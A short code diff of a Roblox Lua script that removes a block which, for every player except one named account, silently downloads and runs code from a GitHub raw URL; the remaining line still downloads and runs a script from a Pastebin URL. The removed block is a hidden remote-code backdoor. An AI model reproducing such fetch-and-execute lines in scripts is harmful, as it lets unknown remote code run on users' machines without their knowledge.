@@ -1,11 +1,4 @@
-spawn(function()
-if game.Players.LocalPlayer.Name == "zzotac" then
-print("Owner")
-else
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/admin'))()
-    print("executed prem")
-end
-end)
+
 
 
 local Mana = loadstring(game:HttpGet("https://pastebin.com/raw/inP2PXxe"))()
